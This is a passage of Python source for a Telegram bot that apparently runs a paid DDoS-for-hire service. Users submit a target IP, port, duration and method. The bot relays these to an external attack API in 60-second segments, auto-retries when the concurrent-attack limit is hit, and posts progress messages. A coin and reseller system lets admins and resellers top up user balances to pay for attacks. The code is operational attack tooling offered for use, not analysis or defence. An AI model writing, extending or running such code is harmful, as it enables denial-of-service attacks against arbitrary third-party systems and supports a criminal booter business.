        f"👤 User: @{username} (ID: `{user_id}`)\n"
        f"🎯 Target: `{target}:{port}`\n"
        f"⏳ Duration: `{attack_time} sec`\n"
        f"🔧 Method: `{method}`"
    )

    # Handle attack with auto-continuation for >60 seconds
    asyncio.create_task(handle_attack_with_continuation(update, target, port, attack_time, method, user_id))

async def handle_attack_with_continuation(update: Update, target: str, port: int, total_time: int, method: str, user_id: str):
    """Handle attack with automatic continuation for >60 seconds"""
    MAX_API_DURATION = 60
    remaining_time = total_time
    attack_count = 0
    all_successful = True
    error_messages = []
    
    initial_message_sent = False
    
    while remaining_time > 0:
        # Calculate current attack duration (max 60 seconds per API call)
        current_duration = min(remaining_time, MAX_API_DURATION)
        
        # Send attack request
        result = await send_api_attack(target, port, current_duration, method)
        
        if result.get("success"):
            attack_id = result.get("attackId", "N/A")
            attack_count += 1
            
            # Send success message for each attack segment
            if not initial_message_sent:
                await update.message.reply_text(
                    f"✅ **Attack {attack_count} Started!**\n"
                    f"🎯 Target: `{target}:{port}`\n"
                    f"⏳ Duration: `{current_duration}s`\n"
                    f"🆔 Attack ID: `{attack_id}`\n\n"
                    f"📊 Total Progress: `{total_time - remaining_time + current_duration}/{total_time}s`"
                )
                initial_message_sent = True
            else:
                await update.message.reply_text(
                    f"🔄 **Continuing Attack {attack_count}...**\n"
                    f"🎯 Target: `{target}:{port}`\n"
                    f"⏳ Additional: `{current_duration}s`\n"
                    f"🆔 Attack ID: `{attack_id}`\n\n"
                    f"📊 Progress: `{total_time - remaining_time + current_duration}/{total_time}s`"
                )
            
            # Wait for the attack duration
            await asyncio.sleep(current_duration)
            remaining_time -= current_duration
            
            # If still time remaining, notify about continuation
            if remaining_time > 0:
                await update.message.reply_text(
                    f"⏰ **{current_duration}s completed!**\n"
                    f"🔄 Starting next attack segment...\n"
                    f"⏳ Remaining: `{remaining_time}s`"
                )
                await asyncio.sleep(2)  # Small gap between attacks
                
        else:
            # Attack failed
            error_msg = result.get("error", "Unknown error")
            error_messages.append(error_msg)
            all_successful = False
            
            # Handle concurrent attack limit
            if "Maximum concurrent attacks reached" in error_msg:
                await update.message.reply_text(
                    f"⚠️ **Attack Delayed!**\n"
                    f"Another attack is already running.\n"
                    f"Please wait and try again in a few seconds.\n\n"
                    f"🔄 Auto-retrying in 10 seconds..."
                )
                await asyncio.sleep(10)
                # Don't reduce remaining_time, retry the same segment
                continue
            else:
                await update.message.reply_text(
                    f"❌ **Attack Failed!**\n"
                    f"Error: `{error_msg}`\n\n"
                    f"⚠️ Please try again later."
                )
                break
    
    # Send final completion message
    if all_successful and remaining_time == 0:
        await update.message.reply_text(
            f"✅ **Attack Completed!**\n"
            f"🎯 Target: `{target}:{port}`\n"
            f"⏳ Total Duration: `{total_time} seconds`\n"
            f"🔧 Method: `{method}`\n"
            f"📊 Total Segments: `{attack_count}`\n\n"
            f"💪 Mahakal's blessing is with you!"
        )
    elif not all_successful:
        await update.message.reply_text(
            f"⚠️ **Attack Partially Completed!**\n"
            f"🎯 Target: `{target}:{port}`\n"
            f"✅ Completed: `{total_time - remaining_time}/{total_time}s`\n"
            f"❌ Failed due to: `{', '.join(error_messages)}`"
        )

async def topup(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.message.chat_id)
    users = load_users()

    if user_id not in users and user_id not in ADMIN_IDS:
        await update.message.reply_text("❌ Only resellers and admins can top up users.")
        return

    command = update.message.text.split()
    if len(command) != 3:
        await update.message.reply_text("📌 Usage: /topup <user_id> <coins>")
        return

    target_user, coins = command[1], command[2]

    if not coins.isdigit():
        await update.message.reply_text("⚠️ Error: Coins must be a number!")
        return

    coins = int(coins)

    if target_user not in users:
        await update.message.reply_text("⚠️ Error: User does not exist!")
        return

    if user_id not in ADMIN_IDS:
        if users[user_id]["role"] != "reseller":
            await update.message.reply_text("❌ Only resellers and admins can top up users!")
            return
        if users[target_user]["role"] == "reseller":
            await update.message.reply_text("⚠️ Resellers cannot top up other resellers!")
            return
        if users[user_id]["coins"] < coins:
            await update.message.reply_text("⚠️ Not enough coins!")
            return
        users[user_id]["coins"] -= coins  

    users[target_user]["coins"] += coins
    save_users(users)

    await context.bot.send_message(GROUP_ID, f"💰 **Top-Up Alert** 💰\n\nUser: {target_user} received {coins} coins from {user_id}.")
    await update.message.reply_text(f"✅ Successfully topped up {coins} coins to {target_user}!")

